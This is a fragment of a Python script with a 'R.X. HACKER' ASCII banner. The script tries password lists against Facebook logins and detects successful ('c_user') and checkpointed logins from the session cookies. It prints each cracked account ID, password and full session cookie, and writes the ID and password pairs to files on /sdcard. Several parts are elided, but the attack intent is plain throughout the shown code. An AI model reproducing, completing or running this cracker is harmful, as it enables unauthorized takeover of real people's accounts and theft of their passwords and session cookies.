...
logo = (""""\033[132m                                                                                                                                                                                                               
`7MM"""Mq.     `YMM'   `MP'        `7MMF'  `7MMF'      db      `7MMF' `YMM' `7MM"""YMM  `7MM"""Mq.      
  MM   `MM.      VMb.  ,P            MM      MM       ;MM:       MM   .M'     MM    `7    MM   `MM.     
  MM   ,M9        `MM.M'             MM      MM      ,V^MM.      MM .d"       MM   d      MM   ,M9      
  MMmmdM9           MMb              MMmmmmmmMM     ,M  `MM      MMMMM.       MMmmMM      MMmmdM9       
  MM  YM.         ,M'`Mb.            MM      MM     AbmmmqMA     MM  VMA      MM   Y  ,   MM  YM.       
  MM   `Mb. ,,   ,P   `MM.  ,,       MM      MM    A'     VML    MM   `MM.    MM     ,M   MM   `Mb.     
.JMML. .JMM.dg .MM:.  .:MMa.dg     .JMML.  .JMML..AMA.   .AMMA..JMML.   MMb..JMMmmmmMMM .JMML. .JMM.    
            ,j              ,j                                                                          
           ,'              ,'                                                                          \033[1;37m\n""")
def ud():
    os.system('clear')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m[R,X, RANDOM-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/R,X, RANDOM-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m[R,X, RANDOM-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/R,X, RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(' %s[R,X, RANDOM] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
